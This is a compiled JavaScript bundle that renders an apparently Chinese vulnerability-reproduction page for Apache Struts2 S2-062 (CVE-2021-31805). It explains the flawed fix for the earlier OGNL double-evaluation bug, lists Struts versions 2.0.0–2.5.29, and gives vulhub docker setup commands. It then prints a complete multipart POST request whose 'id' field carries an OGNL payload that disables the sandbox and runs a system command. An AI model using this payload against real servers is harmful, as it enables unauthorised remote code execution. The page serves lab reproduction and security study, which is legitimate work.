(window.webpackJsonp=window.webpackJsonp||[]).push([[612],{2840:function(t,a,s){t.exports=s.p+"assets/img/1650080283076-09f786e3-30aa-49f1-9650-175b50579d80.66650b50.png"},2841:function(t,a,s){t.exports=s.p+"assets/img/1650080313088-0b8b3c2a-61c0-41be-aaca-f1a7c1fb391c.9e99ae28.png"},3576:function(t,a,s){"use strict";s.r(a);var e=s(63),n=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"apache-struts2-s2-062-远程代码执行漏洞-cve-2021-31805"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apache-struts2-s2-062-远程代码执行漏洞-cve-2021-31805"}},[t._v("#")]),t._v(" Apache Struts2 S2-062 远程代码执行漏洞 CVE-2021-31805")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("该漏洞由于对CVE-2020-17530的修复不完整造成的，CVE-2020-17530漏洞是由于Struts2 会对某些标签属性(比如id) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 %{x} 且 其中x 的值用户可控时，用户再传入一个 %{payload} 即可造成OGNL表达式执行。在CVE-2021-31805漏洞中，仍然存在部分标签属性会造成攻击者恶意构造的OGNL表达式执行，导致远程代码执行。")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("Struts 2.0.0 - Struts 2.5.29")]),t._v(" "),a("h2",{attrs:{id:"环境搭建"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v("git "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("clone")]),t._v(" https"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//github.com/vulhub/vulhub.git")]),t._v("\ncd vulhub"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("struts2"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("s2"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("061")]),t._v("\ndocker"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("compose up "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("d\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("主页面")]),t._v(" "),a("p",[a("img",{attrs:{src:s(2840),alt:"img"}})]),t._v(" "),a("p",[t._v("发送请求包")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("action "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nAccept"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" deflate\nAccept"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nAccept"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Language"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" en\nUser"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Agent"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" Mozilla"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("5.0")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Windows "),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("NT")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" Win64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" x64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" AppleWebKit"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("KHTML")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" like Gecko"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" Chrome"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80.0")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v(".3987")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v(".132")]),t._v(" Safari"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("537.36")]),t._v("\nConnection"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" close\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" multipart"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" boundary"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("829")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Disposition"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" form"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" name"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"id"')]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("WebKitFormBoundaryl7d1B1aGsV2wcZwF"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2841),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);